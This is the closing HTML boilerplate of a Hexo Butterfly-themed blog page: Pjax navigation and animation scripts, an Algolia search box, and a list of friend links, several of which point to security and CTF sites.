Pjax({elements:'a:not([target="_blank"])',selectors:pjaxSelectors,cacheBust:!1,analytics:!1,scrollRestoration:!1});document.addEventListener("pjax:send",(function(){if(window.tocScrollFn&&window.removeEventListener("scroll",window.tocScrollFn),window.scrollCollect&&window.removeEventListener("scroll",scrollCollect),document.getElementById("rightside").style.cssText="opacity: ''; transform: ''",window.aplayers)for(let e=0;e<window.aplayers.length;e++)window.aplayers[e].options.fixed||window.aplayers[e].destroy();"object"==typeof typed&&typed.destroy();const e=document.body.classList;e.contains("read-mode")&&e.remove("read-mode"),"object"==typeof disqusjs&&disqusjs.destroy()})),document.addEventListener("pjax:complete",(function(){window.refreshFn(),document.querySelectorAll("script[data-pjax], .pjax-reload script").forEach((e=>{const t=document.createElement("script"),o=e.text||e.textContent||e.innerHTML||"";Array.from(e.attributes).forEach((e=>t.setAttribute(e.name,e.value))),t.appendChild(document.createTextNode(o)),e.parentNode.replaceChild(t,e)})),GLOBAL_CONFIG.islazyload&&window.lazyLoadInstance.update(),"function"==typeof chatBtnFn&&chatBtnFn(),"function"==typeof panguInit&&panguInit(),"function"==typeof gtag&&gtag("config","",{page_path:window.location.pathname}),"object"==typeof _hmt&&_hmt.push(["_trackPageview",window.location.pathname]),"function"==typeof loadMeting&&document.getElementsByClassName("aplayer").length&&loadMeting(),"object"==typeof Prism&&Prism.highlightAll()})),document.addEventListener("pjax:error",(e=>{404===e.request.status&&pjax.loadUrl("/404.html")}))</script><div class="pjax-reload"><script async>for(var arr=document.getElementsByClassName("recent-post-item"),i=0;i<arr.length;i++)arr[i].classList.add("wow"),arr[i].classList.add("animate__fadeInLeft"),arr[i].setAttribute("data-wow-duration","600ms"),arr[i].setAttribute("data-wow-delay","200ms"),arr[i].setAttribute("data-wow-offset","100"),arr[i].setAttribute("data-wow-iteration","1")</script><script async>for(var arr=document.getElementsByClassName("card-widget"),i=0;i<arr.length;i++)arr[i].classList.add("wow"),arr[i].classList.add("animate__fadeInRightBig"),arr[i].setAttribute("data-wow-duration",""),arr[i].setAttribute("data-wow-delay",""),arr[i].setAttribute("data-wow-offset",""),arr[i].setAttribute("data-wow-iteration","")</script></div><script defer src="https://cdn.jsdelivr.net/gh/graingert/wow@1.3.0/dist/wow.min.js"></script><script defer src="/js/wow_init.js"></script></div><div id="algolia-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="search-wrap"><div id="algolia-search-input"></div><hr><div id="algolia-search-results"><div id="algolia-hits"></div><div id="algolia-pagination"></div><div id="algolia-info"><div class="algolia-stats"></div><div class="algolia-poweredBy"></div></div></div></div></div><div id="search-mask"></div><script src="https://cdn.jsdelivr.net/npm/algoliasearch/dist/algoliasearch-lite.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instantsearch.js/dist/instantsearch.production.min.js"></script><script src="/js/search/algolia.js"></script></div><div class="js-pjax"><script async>for(var arr=document.getElementsByClassName("recent-post-item"),i=0;i<arr.length;i++)arr[i].classList.add("wow"),arr[i].classList.add("animate__fadeInLeft"),arr[i].setAttribute("data-wow-duration","600ms"),arr[i].setAttribute("data-wow-delay","200ms"),arr[i].setAttribute("data-wow-offset","100"),arr[i].setAttribute("data-wow-iteration","1")</script><script async>for(var arr=document.getElementsByClassName("card-widget"),i=0;i<arr.length;i++)arr[i].classList.add("wow"),arr[i].classList.add("animate__fadeInRightBig"),arr[i].setAttribute("data-wow-duration",""),arr[i].setAttribute("data-wow-delay",""),arr[i].setAttribute("data-wow-offset",""),arr[i].setAttribute("data-wow-iteration","")</script></div><script defer src="https://npm.elemecdn.com/hexo-butterfly-wowjs/lib/wow.min.js"></script><script defer src="https://npm.elemecdn.com/hexo-butterfly-wowjs/lib/wow_init.js"></script></body></html><script>var flinks=["https://hexo.io/zh-cn/","https://nodejs.org/en/","https://butterfly.js.org/","https://cnhuazhu.top/","https://www.fomal.cc/","https://guole.fun/","https://akilar.top/","https://zykj.js.org/","https://blog.eurkon.com/","https://fe32.top/","https://blog.anheyu.com/","https://meuicat.com/","https://blog.zhheo.com/","https://blog.justlovesmile.top/","https://uuanqin.top/","https://blog.leonus.cn/","https://aeneag.xyz/","https://www.52pojie.cn/","https://www.kanxue.com/","https://www.anquanke.com/","https://www.freebuf.com/","https://blog.xmcve.com/","https://ctf-wiki.org/","https://bestwing.me/","https://houjingyi233.com/","https://paper.seebug.org/","https://security.tencent.com/index.php/blog/","https://xlab.tencent.com/cn/","https://www.ctfiot.com/blog/","https://www.iotsec-zone.com/article/original","https://www.yuque.com/cyberangel/rg9gdm/","https://www.yuque.com/u239977/","https://www.yuque.com/hxfqg9/","https://blog.aabyss.cn/","https://wiki.wgpsec.org/","https://www.cnblogs.com/trunk","https://lazzzaro.github.io/","https://zikh26.github.io/","https://bbs.kanxue.com/homepage-949925.htm","https://www.henry-blog.life/henry-blog","https://www.yuque.com/cyber1c3","https://blog.imzjw.cn/","https://zfe.space/","https://blog.hclonely.com/","https://whb1990.github.io/","https://nickxu.me/","https://benpaodewoniu.github.io/","https://www.antmoe.com/","https://immmmm.com/","https://blog.jyhao.cn/"];function toRandomFlink(){window.open(flinks[Math.floor(Math.random()*flinks.length)])}</script>